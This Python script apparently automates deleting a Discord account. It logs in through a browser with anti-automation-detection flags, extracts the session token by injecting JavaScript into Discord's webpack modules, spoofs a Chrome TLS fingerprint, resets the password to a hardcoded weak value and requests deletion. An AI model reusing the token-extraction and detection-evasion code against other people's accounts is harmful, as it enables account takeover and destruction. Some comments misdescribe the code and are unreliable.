import os
import random
import string
import requests
import json
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
import time
import shutil

try:
    import tls_client
except ModuleNotFoundError:
    print("Installing tls_client...")
    os.system('pip install tls-client > nul')
    import tls_client

try:
    import requests
except ModuleNotFoundError:
    print("Installing requests...")
    os.system('pip install requests > nul')
    import requests

def get_discord_token(driver):
    js_code = """
    let token = null;
    window.webpackChunkdiscord_app.push([
        [Symbol()],
        {},
        req => {
            if (!req.c) return;
            for (let m of Object.values(req.c)) {
                try {
                    if (!m.exports || m.exports === window) continue;
                    if (m.exports?.getToken) {
                        token = m.exports.getToken();
                        break;
                    }
                    for (let ex in m.exports) {
                        if (m.exports?.[ex]?.getToken && m.exports[ex][Symbol.toStringTag] !== 'IntlMessagesProxy') {
                            token = m.exports[ex].getToken();
                            break;
                        }
                    }
                } catch {}
            }
        },
    ]);
    window.webpackChunkdiscord_app.pop();
    return token;
    """
    return driver.execute_script(js_code)

class Change:
    def get_random_str(self, length: int) -> str:
        return "".join(
            random.choice(string.ascii_letters + string.digits) for _ in range(length)
        )
    
    def get_discord_cookies(self):
        try:
            response = requests.get("https://discord.com")  # Atualizado para discord.com
            if response.status_code == 200:
                return "; ".join(
                    [f"{cookie.name}={cookie.value}" for cookie in response.cookies]
                ) + "; locale=en-US"
            else:
                return "__dcfduid=example; __sdcfduid=example; locale=en-US"  # Placeholder se falhar
        except Exception as e:
            print(f"Erro ao obter cookies: {e}")
            return "locale=en-US"
    
    def Headers(self, token):
        return {
            'authority': 'discord.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9,pt;q=0.8',  # Suporte a PT-BR
            'authorization': token,
            'content-type': 'application/json',
            'cookie': self.get_discord_cookies(),
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',  # Atualizado para 2025
            'x-debug-options': 'bugReporterEnabled',
            'x-discord-locale': 'en-US',
            'x-discord-timezone': 'America/Sao_Paulo',  # Para PT-BR
            'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6InB0LUJSIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjAuMCBTYWZhcmkvNTM3LjM2IEVkZy8xMzEuMC4wLjAiLCJicm93c2VyX3ZlcnNpb24iOiIxMzEuMC4wLjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MzAwMDAwLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==',  # Atualizado
        }
   
    def Changer(self, token, password, email, new_pass, logs=None):
        if logs is None:
            logs = []
        session = tls_client.Session(client_identifier="chrome_131", random_tls_extension_order=True)  # Atualizado
        headers = self.Headers(token)
        data = {
            'password': password,
            'new_password': new_pass,
        }
        try:
            response = session.patch('https://discord.com/api/v9/users/@me', headers=headers, json=data)
            if response.status_code == 200:
                new_token = response.json()['token']
                msg = f"(+): Senha alterada para {email} → {new_token[:20]}..."
                print(msg)
                logs.append({"message": msg, "level": "success"})
                return True, new_token
            elif response.status_code == 400:
                error = response.json()
                if 'code' in error.get('errors', {}).get('password', {}):
                    code = input("2FA requerido para mudança de senha. Digite o código: ")
                    data['code'] = code
                    response = session.patch('https://discord.com/api/v9/users/@me', headers=headers, json=data)
                    if response.status_code == 200:
                        new_token = response.json()['token']
                        msg = f"(+): Senha alterada com 2FA para {email} → {new_token[:20]}..."
                        print(msg)
                        logs.append({"message": msg, "level": "success"})
                        return True, new_token
                msg = f"(!): Erro 400 na mudança para {email}: {error}"
                print(msg)
                logs.append({"message": msg, "level": "error"})
                return False, None
            else:
                msg = f"(!): Falha na mudança para {email}: {response.status_code} - {response.text}"
                print(msg)
                logs.append({"message": msg, "level": "error"})
                return False, None
        except Exception as e:
            msg = f"Exceção na mudança: {e}"
            print(msg)
            logs.append({"message": msg, "level": "error"})
            return False, None

    def Deleter(self, token, password, logs=None):
        if logs is None:
            logs = []
        session = tls_client.Session(client_identifier="chrome_131", random_tls_extension_order=True)
        headers = self.Headers(token)
        data = {"password": password}
        try:
            response = session.post('https://discord.com/api/v9/users/@me/delete', headers=headers, json=data)
            if response.status_code == 204:
                msg = "Solicitação de exclusão enviada com sucesso. Não logue por 14 dias até a conta ser excluida"
                print(msg)
                logs.append({"message": msg, "level": "success"})
                return True
            elif response.status_code == 400:
                error = response.json()
                if 'code' in error.get('errors', {}).get('password', {}):
                    code = input("2FA requerido para exclusão. Digite o código: ")
                    data['code'] = code
                    response = session.post('https://discord.com/api/v9/users/@me/delete', headers=headers, json=data)
                    if response.status_code == 204:
                        msg = "Solicitação de exclusão enviada com sucesso (com 2FA)."
                        print(msg)
                        logs.append({"message": msg, "level": "success"})
                        return True
                msg = f"(!): Erro 400 na exclusão: {error}"
                print(msg)
                logs.append({"message": msg, "level": "error"})
                return False
            else:
                msg = f"(!): Falha na exclusão: {response.status_code} - {response.text}"
                print(msg)
                logs.append({"message": msg, "level": "error"})
                return False
        except Exception as e:
            msg = f"Exceção na exclusão: {e}"
            print(msg)
            logs.append({"message": msg, "level": "error"})
            return False

def process_account(email, old_password, new_password):
    """Processa uma conta: obtém token, muda senha e exclui."""
    logs = []  # Lista para capturar logs

    def log_message(msg, level="info"):
        print(msg)  # Mantém no terminal
        logs.append({"message": msg, "level": level})  # Para Streamlit

    log_message("Iniciando o processo de login automático...")

    # Loop para login até sucesso
    token = None
    while not token:
        log_message("Tentando login automático. Aguarde...")

        # Configuração para Brave
        brave_path = 'C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe'

        options = Options()
        options.binary_location = brave_path
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option("useAutomationExtension", False)
        options.add_argument("--incognito")
        options.add_argument("--disable-notifications")
        options.add_argument("--user-data-dir=" + os.path.join(os.getcwd(), "temp_profile_token"))

        driver = webdriver.Chrome(options=options)

        login_success = False
        try:
            driver.get('https://discord.com/login')

            WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "email")))
            email_input = driver.find_element(By.NAME, "email")
            email_input.clear()  # Limpa se houver algo
            email_input.send_keys(email)

            password_input = driver.find_element(By.NAME, "password")
            password_input.clear()
            password_input.send_keys(old_password)

            submit_button = driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
            submit_button.click()

            # Verifica se login falhou (ainda na página de login ou erro visível)
            time.sleep(3)  # Delay para resposta
            current_url = driver.current_url
            page_source = driver.page_source.lower()

            error_type = None
            if 'login' in current_url:
                # Verifica mensagens específicas de erro
                if any(phrase in page_source for phrase in ['couldn\'t find an account', 'não encontramos uma conta', 'email not found', 'e-mail não encontrado']):
                    error_type = "Wrong Email"
                elif any(phrase in page_source for phrase in ['incorrect password', 'senha incorreta', 'invalid credentials']):
                    error_type = "Wrong Password"
                else:
                    error_type = "Wrong Login"

            if error_type:
                msg = f"{error_type}, please try again:"
                log_message(msg, "error")
                if error_type == "Wrong Email":
                    email = input("Enter your email: ")
                old_password = input("Enter your old password: ")  # Sempre pede senha para segurança
                login_success = False
            else:
                try:
                    WebDriverWait(driver, 60).until(lambda d: EC.url_contains('channels')(d) or EC.url_contains('app')(d))
                    login_success = True
                except TimeoutException:
                    # Verifica 2FA
                    try:
                        code_input = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "code")))
                        if code_input:
                            code = input("Enter your 2FA code for login: ")
                            code_input.send_keys(code)
                            submit_button = driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
                            submit_button.click()
                            WebDriverWait(driver, 60).until(lambda d: EC.url_contains('channels')(d) or EC.url_contains('app')(d))
                            login_success = True
                            log_message("Login com 2FA bem-sucedido!", "success")
                    except TimeoutException:
                        msg = "Falha no login (possivelmente credenciais erradas ou CAPTCHA)."
                        log_message(msg, "error")
                        msg2 = "Wrong Login, please try again:"
                        log_message(msg2, "error")
                        email = input("Enter your email: ")
                        old_password = input("Enter your old password: ")
                        login_success = False

            if login_success:
                token = get_discord_token(driver)
                if not token:
                    log_message("Não foi possível obter o token. Tentando novamente...", "warning")
                    token = None
                else:
                    log_message("Token obtido com sucesso! Fechando navegador...", "success")
            else:
                token = None

        finally:
            driver.quit()
            time.sleep(2)  # Delay para fechar
            profile_dir = os.path.join(os.getcwd(), "temp_profile_token")
            try:
                if os.path.exists(profile_dir):
                    shutil.rmtree(profile_dir)
            except:
                pass

    if token:
        # Agora usa o código adaptado para mudar senha e excluir
        changer = Change()
        change_success, new_token = changer.Changer(token, old_password, email, new_password, logs)

        if change_success and new_token:
            log_message("Mudança de senha bem-sucedida. Prosseguindo para exclusão...", "success")
            deleter_success = changer.Deleter(new_token, new_password, logs)
            if deleter_success:
                log_message("Tudo concluído!", "success")
            else:
                log_message("Falha na exclusão.", "error")
        else:
            log_message("Falha na mudança de senha. Tentando exclusão com senha antiga...", "warning")
            deleter_success = changer.Deleter(token, old_password, logs)
            if deleter_success:
                log_message("Exclusão concluída com senha antiga.", "success")
            else:
                log_message("Falha na exclusão.", "error")
    else:
        log_message("Falha ao obter token. Processo cancelado.", "error")

    return logs  # Retorna os logs para o Streamlit

def main():
    new_password = "deletingsoon123"  # Atualizado para senha mais forte

    while True:
        email = input("Enter your email: ")
        old_password = input("Enter your old password: ")
        print(f"Nova senha será definida como: {new_password}")

        process_account(email, old_password, new_password)

        restart = input("Deseja voltar ao início? (Y/N): ").strip().upper()
        if restart != 'Y':
            print("Fechando...")
            break

if __name__ == "__main__":
    main()